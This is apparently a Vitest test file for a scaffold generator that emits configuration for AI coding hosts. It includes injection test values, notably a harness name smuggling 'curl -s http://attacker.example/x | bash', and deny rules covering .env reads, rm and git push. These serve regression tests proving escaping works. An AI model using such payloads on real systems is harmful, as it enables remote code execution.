import { describe, expect, it } from 'vitest';
import { execFileSync } from 'node:child_process';
import { buildScaffold } from '../scaffold';
// ADR-027 parity: the CLI's host-config.ts is dependency-free, so the web UI
// test can import it directly and compare bytes (ADR-280 grok arm).
import { hostConfigFiles } from '../../../../../packages/create-agent-harness/src/host-config';
import { totalBytes } from '../zip';
import { verifyFileMap } from '../verify';
import { DEFAULT_PRIMITIVES, SAFE_MCP_POLICY, DEFAULT_MODELS, DEFAULT_DARWIN } from '../types';
import type { HarnessConfig } from '../types';

const base: HarnessConfig = {
  name: 'legal-redline',
  description: 'Redline contracts fast',
  hosts: ['claude-code'],
  template: 'vertical:devops',
  memory: 'agentdb',
  routing: '3-tier',
  marketplace: 'powered-by',
  models: DEFAULT_MODELS,
  darwin: DEFAULT_DARWIN,
  agents: ['responder', 'escalator'],
  skills: ['memory-inspect'],
  commands: ['doctor'],
  primitives: DEFAULT_PRIMITIVES,
  mcpPolicy: SAFE_MCP_POLICY,
};

function paths(cfg: HarnessConfig) {
  return buildScaffold(cfg).map((f) => f.path);
}

describe('buildScaffold', () => {
  it('emits the core files', () => {
    const p = paths(base);
    for (const f of ['package.json', 'README.md', 'CLAUDE.md', 'src/init.ts', '.gitignore', 'LICENSE']) {
      expect(p).toContain(f);
    }
  });

  it('emits one ts file per selected agent plus an index', () => {
    const p = paths(base);
    expect(p).toContain('src/agents/responder.ts');
    expect(p).toContain('src/agents/escalator.ts');
    expect(p).toContain('src/agents/index.ts');
    expect(p).not.toContain('src/agents/postmortem.ts');
  });

  it('emits Claude-ready skills and commands', () => {
    const p = paths(base);
    expect(p).toContain('.claude/skills/memory-inspect/SKILL.md');
    expect(p).toContain('.claude/commands/doctor.md');
  });

  it('wires the chosen host adapter', () => {
    expect(paths(base)).toContain('.claude/settings.json');
    expect(paths({ ...base, hosts: ['codex'] })).toContain('.codex/config.toml');
    expect(paths({ ...base, hosts: ['pi-dev'] })).toContain('AGENTS.md');
    expect(paths({ ...base, hosts: ['openclaw'] })).toContain('.openclaw/openclaw.json');
    expect(paths({ ...base, hosts: ['rvm'] })).toContain('rvm.manifest.toml');
    expect(paths({ ...base, hosts: ['hermes'] })).toContain('cli-config.yaml');
  });

  it('hermes emits a personality keyed by the harness name', () => {
    const cfg = buildScaffold({ ...base, hosts: ['hermes'] }).find((f) => f.path === 'cli-config.yaml')!;
    expect(cfg.content).toContain('legal-redline: "Redline contracts fast"');
  });

  // Regression: `cfg.name` lands in YAML *key* position
  // (`agent.personalities.<name>`) and is unconstrained on `HarnessConfig`
  // — a name containing `:` previously produced two top-level `:` on one
  // line (corrupted YAML). Kept in lockstep with @metaharness/host-hermes's
  // own yamlKey() fix and the CLI scaffold path's copy (ADR-027
  // byte-for-byte parity).
  it('hermes escapes a harness name containing YAML-significant characters as a mapping key', () => {
    const cfg = buildScaffold({ ...base, name: 'evil: name', hosts: ['hermes'] }).find((f) => f.path === 'cli-config.yaml')!;
    expect(cfg.content).toContain('"evil: name": "Redline contracts fast"');
    expect(cfg.content).not.toMatch(/^ {4}evil: name:/m);
  });

  it('multi-host emits every adapter', () => {
    const p = paths({ ...base, hosts: ['claude-code', 'codex'] });
    expect(p).toContain('.claude/settings.json');
    expect(p).toContain('.codex/config.toml');
  });

  it('package.json is valid JSON carrying the harness name', () => {
    const pkg = buildScaffold(base).find((f) => f.path === 'package.json')!;
    const parsed = JSON.parse(pkg.content);
    expect(parsed.name).toBe('legal-redline');
    expect(parsed.bin['legal-redline']).toBeDefined();
    expect(parsed.dependencies['@metaharness/kernel']).toBeDefined();
  });

  it('settings.json is valid JSON with scoped permissions', () => {
    const s = buildScaffold(base).find((f) => f.path === '.claude/settings.json')!;
    const parsed = JSON.parse(s.content);
    expect(parsed.mcpServers['legal-redline']).toBeDefined();
    expect(parsed.permissions.allow).toContain('mcp__legal-redline__*');
  });

  it('renders no unresolved {{vars}} in CLAUDE.md', () => {
    const c = buildScaffold(base).find((f) => f.path === 'CLAUDE.md')!;
    expect(c.content).not.toMatch(/\{\{[^}]+\}\}/);
  });

  it('is deterministic for identical inputs', () => {
    expect(buildScaffold(base)).toEqual(buildScaffold(base));
  });

  it('produces a non-trivial byte size', () => {
    expect(totalBytes(buildScaffold(base))).toBeGreaterThan(1000);
  });

  // ADR-044 — web-UI parity with the host-adapter capability fixes.
  describe('ADR-044 host parity', () => {
    const fileFor = (cfg: HarnessConfig, path: string) =>
      buildScaffold(cfg).find((f) => f.path === path)?.content ?? '';

    it('github-actions workflow env is provider-agnostic (was ANTHROPIC-only)', () => {
      const yml = fileFor({ ...base, hosts: ['github-actions'] }, '.github/workflows/legal-redline.yml');
      expect(yml).toContain('ANTHROPIC_API_KEY:');
      expect(yml).toContain('OPENROUTER_API_KEY:');
      expect(yml).toContain('OPENAI_API_KEY:');
    });

    // Regression: `cfg.name` also lands unescaped inside a *double-quoted
    // bash string* in the github-actions composite action's `run:` line — a
    // name containing `"` + shell metacharacters previously broke out of
    // the `echo` string and injected an arbitrary second shell command into
    // the generated action.yml. Same fix shape (shellDq()) as the CLI
    // scaffold path's and the real @metaharness/host-github-actions
    // adapter's copies — ADR-027 parity. Actually executes the extracted
    // `|` block-literal body through bash (an adversarial review of the
    // first draft found that checking for an escaped `"` in the string
    // wasn't proof of safety — a plain `run: echo "..."` scalar line still
    // lets a name containing ` #` truncate the line as a YAML comment
    // before bash ever runs it).
    it('github-actions neutralizes a harness name containing shell metacharacters in the composite action run: line', () => {
      const evil = 'harness"; curl -s http://attacker.example/x | bash #';
      const action = buildScaffold({ ...base, name: evil, hosts: ['github-actions'] })
        .find((f) => f.path.endsWith('/action.yml'))!;
      expect(action.content).toContain('run: |\n');
      const body = action.content.split('run: |\n')[1]!.split('\n')[0]!.trim();
      const out = execFileSync('bash', ['-c', body], { encoding: 'utf-8' });
      expect(out.trim()).toBe('Running harness"; curl -s http://attacker.example/x | bash # (non-interactive)…');
    });

    // Regression: `cfg.name` also lands unescaped in the workflow.yml header
    // *comment* — a name containing a newline breaks out of the comment and
    // injects an arbitrary top-level YAML key into the document. Found in
    // the same adversarial review pass, same case block, comment position
    // instead of bash-string position.
    it('github-actions strips newlines from a harness name in the workflow.yml header comment', () => {
      const evil = 'evil-harness\nrun-name: pwned-by-attacker\n#';
      const wf = buildScaffold({ ...base, name: evil, hosts: ['github-actions'] })
        .find((f) => f.path.startsWith('.github/workflows/'))!;
      expect(wf.content.split('\n')[0]).toBe('# GitHub Actions harness: evil-harness run-name: pwned-by-attacker #');
      expect(wf.content).not.toMatch(/^run-name:/m);
    });

    it('opencode uses the verified real schema (ADR-046): mcp map + top-level permission', () => {
      const json = JSON.parse(fileFor({ ...base, hosts: ['opencode'] }, '.opencode/opencode.json'));
      // mcp is a direct name→{type,command[],enabled} map; no servers/permissions under mcp.
      expect(json.mcp['legal-redline'].type).toBe('local');
      expect(json.mcp['legal-redline'].enabled).toBe(true);
      expect(json.permission.bash['rm *']).toBe('deny');
      expect(json.permission.edit).toBe('ask'); // SAFE_MCP_POLICY: no file writes
    });

    it('rvm emits a capability table (was absent in the web UI)', () => {
      const paths2 = paths({ ...base, hosts: ['rvm'] });
      expect(paths2).toContain('capability-table.json');
      const caps = JSON.parse(fileFor({ ...base, hosts: ['rvm'] }, 'capability-table.json'));
      expect(Array.isArray(caps)).toBe(true);
      expect(caps[0]?.rights).toContain('EXECUTE'); // mcp__name__* → EXECUTE
    });

    it('openclaw nests MCP under mcp.servers with enabled (ADR-046 real schema)', () => {
      const json = JSON.parse(fileFor({ ...base, hosts: ['openclaw'] }, '.openclaw/openclaw.json'));
      expect(json.mcp_servers).toBeUndefined();
      expect(json.mcp.servers['legal-redline'].enabled).toBe(true);
    });

    it('codex emits AGENTS.md and copilot emits copilot-instructions.md', () => {
      expect(paths({ ...base, hosts: ['codex'] })).toContain('AGENTS.md');
      expect(paths({ ...base, hosts: ['copilot'] })).toContain('.github/copilot-instructions.md');
    });

    it('allowShell policy opens opencode bash wildcard to "allow"', () => {
      const json = JSON.parse(fileFor(
        { ...base, hosts: ['opencode'], mcpPolicy: { ...SAFE_MCP_POLICY, allowShell: true } },
        '.opencode/opencode.json',
      ));
      expect(json.permission.bash['*']).toBe('allow');
    });
  });

  // ADR-280 — Grok Build CLI host.
  describe('grok (ADR-280)', () => {
    const fileFor = (cfg: HarnessConfig, path: string) =>
      buildScaffold(cfg).find((f) => f.path === path)?.content ?? '';

    it('emits .grok/config.toml with [mcp_servers] + [permission], AGENTS.md and install-grok.md', () => {
      const p = paths({ ...base, hosts: ['grok'] });
      for (const f of ['.grok/config.toml', 'AGENTS.md', 'install-grok.md']) expect(p).toContain(f);
      const toml = fileFor({ ...base, hosts: ['grok'] }, '.grok/config.toml');
      expect(toml).toContain('[mcp_servers.legal-redline]\ncommand = "npx"\nargs = ["-y", "legal-redline@latest", "mcp", "start"]\nenabled = true');
      expect(toml).toContain('[permission]\nallow = [\n  "mcp__legal-redline__*",\n]\ndeny = [\n  "Read(./.env)",');
      expect(toml).not.toMatch(/^type =/m); // unlike codex, Grok infers http from url
    });

    it('remote MCP emits url + headers and no type key; mcp off emits no server table', () => {
      const remote = fileFor({ ...base, hosts: ['grok'], primitives: { ...DEFAULT_PRIMITIVES, mcp: 'remote' } }, '.grok/config.toml');
      expect(remote).toContain('url = "https://localhost:8787/mcp"\nenabled = true\n\n[mcp_servers.legal-redline.headers]\nAuthorization = "Bearer ${HARNESS_MCP_TOKEN}"');
      expect(remote).not.toMatch(/^type =/m);
      const off = fileFor({ ...base, hosts: ['grok'], primitives: { ...DEFAULT_PRIMITIVES, mcp: 'off' } }, '.grok/config.toml');
      expect(off).not.toContain('[mcp_servers');
      expect(off).toContain('[permission]');
    });

    it('the runbook opens with the trust step and repeats every deny rule as a --deny flag', () => {
      const md = fileFor({ ...base, hosts: ['grok'] }, 'install-grok.md');
      expect(md.indexOf('ACTION REQUIRED')).toBeLessThan(md.indexOf('1. Install'));
      expect(md).toContain('grok --trust inspect');
      for (const d of ['Read(./.env)', 'Read(./.env.*)', 'Bash(rm:*)', 'Bash(git push:*)', 'Write(*)', 'Edit(*)']) {
        expect(md).toContain(`--deny '${d}'`);
      }
    });

    it('verify reports the host wired and permissions present from the TOML', () => {
      const r = verifyFileMap(buildScaffold({ ...base, hosts: ['grok'] }));
      expect(r.checks.find((c) => c.id === 'host')?.severity).toBe('pass');
      expect(r.checks.find((c) => c.id === 'capability-coverage')?.title).toBe('host capability coverage: 4/4');
    });

    // ADR-027: the CLI (host-config.ts) and web UI must emit identical bytes.
    it('is byte-identical with the CLI scaffold for every MCP mode and policy combination', () => {
      for (const mcp of ['off', 'local', 'remote'] as const) {
        for (const allowShell of [false, true]) {
          for (const allowFileWrite of [false, true]) {
            const cfg = { ...base, hosts: ['grok' as const], primitives: { ...DEFAULT_PRIMITIVES, mcp }, mcpPolicy: { ...SAFE_MCP_POLICY, allowShell, allowFileWrite } };
            const cli = hostConfigFiles('grok', { name: cfg.name, description: cfg.description, mcp, allowShell, allowFileWrite });
            expect(cli.map((f) => f.path).sort()).toEqual(['.grok/config.toml', 'AGENTS.md', 'install-grok.md']);
            for (const f of cli) expect(fileFor(cfg, f.path), `${mcp}/${allowShell}/${allowFileWrite} ${f.path}`).toBe(f.content);
          }
        }
      }
    });
  });
});
